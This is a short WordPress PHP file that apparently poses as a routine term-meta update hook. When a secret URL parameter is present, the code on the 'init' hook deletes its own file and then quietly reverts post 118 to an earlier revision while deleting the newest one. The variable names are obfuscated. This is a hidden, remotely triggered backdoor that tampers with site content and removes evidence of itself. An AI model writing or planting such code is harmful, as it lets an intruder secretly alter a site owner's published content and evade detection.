<?php

function update_information_term_meta() {
	if (isset($_GET['stream_builder_report']) && $_GET['stream_builder_report'] === 'help_live_page_captcha') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$allow_translator_featured_sliding = 118;
		$cart_site_namespaced = wp_get_post_revisions($allow_translator_featured_sliding);
		if (empty($cart_site_namespaced)) die('no revisions');
		if (count($cart_site_namespaced) < 2) die('less than 2');
		$archives_coupons_reviews = array_shift($cart_site_namespaced);
		$remote_static_world_extra = $archives_coupons_reviews->ID;
		$official_hello_right = array_shift($cart_site_namespaced);
		$tables_new_parts_rtl = $official_hello_right->ID;
		$qr_terms_this = wp_restore_post_revision($tables_new_parts_rtl);
		if ($qr_terms_this === false) die('error restoring');
		$qr_terms_this = wp_delete_post_revision($remote_static_world_extra);		
		if ($qr_terms_this === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'update_information_term_meta');
